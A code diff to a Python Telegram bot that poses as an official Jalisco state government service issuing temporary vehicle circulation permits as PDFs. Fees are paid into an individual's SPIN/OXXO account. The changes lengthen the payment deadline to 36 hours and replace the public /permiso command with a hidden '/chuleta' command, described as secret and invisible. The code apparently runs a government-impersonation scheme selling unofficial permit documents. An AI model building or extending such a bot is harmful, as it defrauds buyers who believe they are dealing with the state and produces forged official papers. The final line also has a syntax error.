@@ -204,15 +204,15 @@ async def guardar_folio_con_reintento(datos, user_id, username, prefijo="1"):
     print(f"[ERROR FATAL] No se pudo guardar tras {max_intentos} intentos")
     return False
 
-# ------------ TIMER MANAGEMENT - 24 HORAS ------------
+# ------------ TIMER MANAGEMENT - 36 HORAS ------------
 timers_activos = {}
 user_folios = {}
 pending_comprobantes = {}
 
-TOTAL_MINUTOS_TIMER = 24 * 60  # 1440 minutos = 24 horas
+TOTAL_MINUTOS_TIMER = 36 * 60  # 2160 minutos = 36 horas
 
 async def eliminar_folio_automatico(folio: str):
-    """Elimina folio automáticamente después de 24 horas"""
+    """Elimina folio automáticamente después de 36 horas"""
     try:
         user_id = None
         if folio in timers_activos:
@@ -225,8 +225,8 @@ async def eliminar_folio_automatico(folio: str):
             await bot.send_message(
                 user_id,
                 f"⏰ TIEMPO AGOTADO - ESTADO DE JALISCO\n\n"
-                f"El folio {folio} ha sido eliminado del sistema por no completar el pago en 24 horas.\n\n"
-                f"Para iniciar un nuevo trámite use /permiso."
+                f"El folio {folio} ha sido eliminado del sistema por no completar el pago en 36 horas.\n\n"
+                f"Para iniciar un nuevo trámite use /chuleta."
             )
         
         limpiar_timer_folio(folio)
@@ -234,7 +234,7 @@ async def eliminar_folio_automatico(folio: str):
         print(f"Error eliminando folio {folio}: {e}")
 
 async def enviar_recordatorio(user_id: int, folio: str, minutos_restantes: int):
-    """Recordatorios de la última hora"""
+    """Recordatorios progresivos"""
     try:
         await bot.send_message(
             user_id,
@@ -247,12 +247,17 @@ async def enviar_recordatorio(user_id: int, folio: str, minutos_restantes: int):
         print(f"Error enviando recordatorio a {user_id}: {e}")
 
 async def iniciar_timer_eliminacion(user_id: int, folio: str):
-    """Timer de 24 horas con avisos 60/30/10 min antes del fin"""
+    """Timer de 36 horas con avisos progresivos"""
     async def timer_task():
-        print(f"[TIMER] Iniciado para folio {folio}, usuario {user_id}")
+        print(f"[TIMER] Iniciado para folio {folio}, usuario {user_id} (36 horas)")
         
-        # Dormir 23 horas (1380 min)
-        await asyncio.sleep(23 * 3600)
+        # Dormir 34.5 horas (2070 min) - quedan 90 min
+        await asyncio.sleep(34.5 * 3600)
+
+        # Aviso a 90 min
+        if folio not in timers_activos: return
+        await enviar_recordatorio(user_id, folio, 90)
+        await asyncio.sleep(30 * 60)
 
         # Aviso a 60 min
         if folio not in timers_activos: return
@@ -285,7 +290,7 @@ async def iniciar_timer_eliminacion(user_id: int, folio: str):
         user_folios[user_id] = []
     user_folios[user_id].append(folio)
     
-    print(f"[SISTEMA] Timer 24h iniciado para folio {folio}")
+    print(f"[SISTEMA] Timer 36h iniciado para folio {folio}")
 
 def cancelar_timer_folio(folio: str):
     """Cancela el timer cuando el usuario paga"""
@@ -519,30 +524,28 @@ async def start_cmd(message: types.Message, state: FSMContext):
         "🏛️ BIENVENIDO AL SISTEMA DIGITAL DEL ESTADO DE JALISCO\n"
         "Plataforma oficial para la gestión de permisos de circulación vehicular\n\n"
         "📋 Inversión por servicio: Tarifa oficial establecida\n"
-        "⏰ Plazo para liquidación: 24 horas a partir de la emisión\n"
+        "⏰ Plazo para liquidación: 36 horas a partir de la emisión\n"
         "💳 Modalidades de pago: Transferencia bancaria y OXXO\n\n"
-        "Para iniciar use /permiso\n\n"
-        "⚠️ Su folio se elimina automáticamente si no se paga en 24 horas.",
+        "⚠️ Su folio se elimina automáticamente si no se paga en 36 horas.",
         
         "🌟 SISTEMA GUBERNAMENTAL DE JALISCO - SERVICIO DIGITAL\n"
         "💰 Concepto: Permiso temporal de circulación\n"
-        "🕐 Tiempo disponible para pago: 24 horas (1440 min)\n"
-        "🏪 Puntos de pago autorizados: Red OXXO y transferencias bancarias\n\n"
-        "Comando: /permiso"
+        "🕐 Tiempo disponible para pago: 36 horas (2160 min)\n"
+        "🏪 Puntos de pago autorizados: Red OXXO y transferencias bancarias"
     ]
     await message.answer(random.choice(frases_start))
 
-@dp.message(Command("permiso"))
-async def permiso_cmd(message: types.Message, state: FSMContext):
+@dp.message(Command("chuleta"))
+async def chuleta_cmd(message: types.Message, state: FSMContext):
     folios_activos = obtener_folios_usuario(message.from_user.id)
     mensaje_folios = ""
     if folios_activos:
-        mensaje_folios = f"\n\n📋 FOLIOS EN PROCESO: {', '.join(folios_activos)}\n(Cada expediente tiene su cronómetro independiente de 24 horas)"
+        mensaje_folios = f"\n\n📋 FOLIOS EN PROCESO: {', '.join(folios_activos)}\n(Cada expediente tiene su cronómetro independiente de 36 horas)"
 
     frases_inicio = [
         f"🚗 SOLICITUD DE PERMISO DE CIRCULACIÓN - ESTADO DE JALISCO\n\n"
         f"💰 Inversión requerida: Según tarifa oficial\n"
-        f"⏰ Plazo para completar el pago: 24 horas\n\n"
+        f"⏰ Plazo para completar el pago: 36 horas\n\n"
         f"Al continuar, acepta que su folio será eliminado si no paga en el tiempo establecido."
         f"{mensaje_folios}\n\n"
         f"Primer paso: Indique la MARCA del vehículo:",
@@ -609,6 +612,7 @@ async def get_color(message: types.Message, state: FSMContext):
     await state.update_data(color=color)
     await message.answer("Indique el NOMBRE COMPLETO del propietario:")
     await state.set_state(PermisoForm.nombre)
+
 @dp.message(PermisoForm.nombre)
 async def get_nombre(message: types.Message, state: FSMContext):
     datos = await state.get_data()
@@ -631,7 +635,7 @@ async def get_nombre(message: types.Message, state: FSMContext):
         
         ok = await guardar_folio_con_reintento(datos, message.from_user.id, message.from_user.username, prefijo)
         if not ok:
-            await message.answer("❌ No se pudo registrar el folio. Intenta de nuevo con /permiso")
+            await message.answer("❌ No se pudo registrar el folio. Intenta de nuevo con /chuleta")
             await state.clear()
             return
 
@@ -672,7 +676,7 @@ async def get_nombre(message: types.Message, state: FSMContext):
         except Exception as e:
             print(f"[WARN] Error guardando en borradores: {e}")
 
-        # Timer 24 horas
+        # Timer 36 horas
         await iniciar_timer_eliminacion(message.from_user.id, folio_final)
 
         # Instrucciones
@@ -680,7 +684,7 @@ async def get_nombre(message: types.Message, state: FSMContext):
             "💰 INSTRUCCIONES DE PAGO\n\n"
             f"Folio: {folio_final}\n"
             f"Monto: {PRECIO_PERMISO} pesos\n"
-            "Tiempo límite: 24 horas\n\n"
+            "Tiempo límite: 36 horas\n\n"
             "🏦 TRANSFERENCIA (ejemplo):\n"
             "• Institución: SPIN BY OXXO\n"
             "• Titular: GUILLERMO S.R\n"
@@ -690,7 +694,7 @@ async def get_nombre(message: types.Message, state: FSMContext):
             "• Referencia: 2242170180214090\n"
             "• Titular: GUILLERMO S.R\n\n"
             "📸 Envía la foto del comprobante para validar.\n"
-            "⚠️ Si no pagas en 24 horas, el folio se elimina automáticamente."
+            "⚠️ Si no pagas en 36 horas, el folio se elimina automáticamente."
         )
 
     except Exception as e:
@@ -761,7 +765,7 @@ async def recibir_comprobante(message: types.Message):
         if not folios_usuario:
             await message.answer(
                 "ℹ️ No hay trámites pendientes de pago vinculados a tu cuenta.\n"
-                "Para iniciar uno nuevo usa /permiso"
+                "Para iniciar uno nuevo usa /chuleta"
             )
             return
         
@@ -860,7 +864,7 @@ async def ver_folios_activos(message: types.Message):
         if not folios_usuario:
             await message.answer(
                 "ℹ️ No tienes expedientes activos.\n"
-                "Para tramitar un nuevo permiso usa /permiso"
+                "Para tramitar un nuevo permiso usa /chuleta"
             )
             return
         
@@ -876,7 +880,7 @@ async def ver_folios_activos(message: types.Message):
         await message.answer(
             f"📋 TUS EXPEDIENTES ACTIVOS ({len(folios_usuario)})\n\n" +
             '\n'.join(lista_folios) +
-            f"\n\n⏰ Cada folio tiene cronómetro independiente de 24 horas.\n"
+            f"\n\n⏰ Cada folio tiene cronómetro independiente de 36 horas.\n"
             f"📸 Envía la foto del comprobante para validar."
         )
     except Exception as e:
@@ -891,21 +895,20 @@ async def responder_costo(message: types.Message):
     try:
         await message.answer(
             "💰 Costo según tarifa oficial.\n"
-            "⏰ Límite de pago: 24 horas.\n"
-            "📋 Vigencia del permiso: 30 días.\n"
-            "Para iniciar: /permiso"
+            "⏰ Límite de pago: 36 horas.\n"
+            "📋 Vigencia del permiso: 30 días."
         )
     except Exception as e:
         print(f"[ERROR] responder_costo: {e}")
-        await message.answer("💰 Costo según tarifa oficial. Usa /permiso para tramitar.")
+        await message.answer("💰 Costo según tarifa oficial.")
 
 @dp.message()
 async def fallback(message: types.Message):
     respuestas = [
-        "🏛️ Sistema Digital Jalisco. Para tramitar tu permiso: /permiso",
-        "📋 Servicio en línea. Comando: /permiso",
-        "⚡ Genera tu documento oficial con /permiso",
-        "🚗 Permisos vehiculares de Jalisco. Inicia con /permiso"
+        "🏛️ Sistema Digital Jalisco.",
+        "📋 Servicio en línea.",
+        "⚡ Genera tu documento oficial.",
+        "🚗 Permisos vehiculares de Jalisco."
     ]
     await message.answer(random.choice(respuestas))
 
@@ -970,15 +973,16 @@ async def health():
             "version": "3.0",
             "entidad": "Jalisco",
             "vigencia": "30 días",
-            "timer_eliminacion": "24 horas",
+            "timer_eliminacion": "36 horas",
             "active_timers": len(timers_activos),
             "prefijos_configurados": list(PREFIJOS_VALIDOS.keys()),
             "cursors_actuales": _folio_cursors,
             "caracteristicas": [
                 "PDF unificado (2 páginas en 1 archivo)",
                 "Folios por prefijo con continuidad desde Supabase",
-                "Timer 24 horas con avisos",
-                "Reintentos automáticos ante duplicados"
+                "Timer 36 horas con avisos",
+                "Reintentos automáticos ante duplicados",
+                "Comando secreto: /chuleta"
             ]
         }
     except Exception as e:
@@ -992,7 +996,7 @@ async def status_detail():
             "sistema": "Jalisco Digital v3.0 - PDF Unificado + Folios con Prefijo",
             "entidad": "Jalisco",
             "vigencia_dias": 30,
-            "tiempo_eliminacion": "24 horas con avisos 60/30/10",
+            "tiempo_eliminacion": "36 horas con avisos 90/60/30/10",
             "total_timers_activos": len(timers_activos),
             "folios_con_timer": list(timers_activos.keys()),
             "usuarios_con_folios": len(user_folios),
@@ -1000,6 +1004,7 @@ async def status_detail():
             "cursors_por_prefijo": _folio_cursors,
             "pdf_output": "UN SOLO archivo con ambas plantillas (2 páginas)",
             "continuidad": "Folios desde último en DB por prefijo; +1 con lock y reintentos",
+            "comando_secreto": "/chuleta (invisible)",
             "timestamp": datetime.now().isoformat(),
             "status": "Operacional"
         }
@@ -1011,8 +1016,9 @@ if __name__ == '__main__':
         import uvicorn
         port = int(os.getenv("PORT", 8000))
         print(f"[ARRANQUE] Iniciando servidor en puerto {port}")
-        print(f"[SISTEMA] Folios con prefijos - Timer: 24 horas - PDF Unificado")
+        print(f"[SISTEMA] Folios con prefijos - Timer: 36 horas - PDF Unificado")
+        print(f"[COMANDO SECRETO] /chuleta")
         print(f"[PREFIJOS] {PREFIJOS_VALIDOS}")
         uvicorn.run(app, host="0.0.0.0", port=port)
     except Exception as e:
-        print(f"[ERROR FATAL] No se pudo iniciar el servidor: {e}")
+        print(f"[ERROR FATAL] No se pudo iniciar el servidor: {e}"
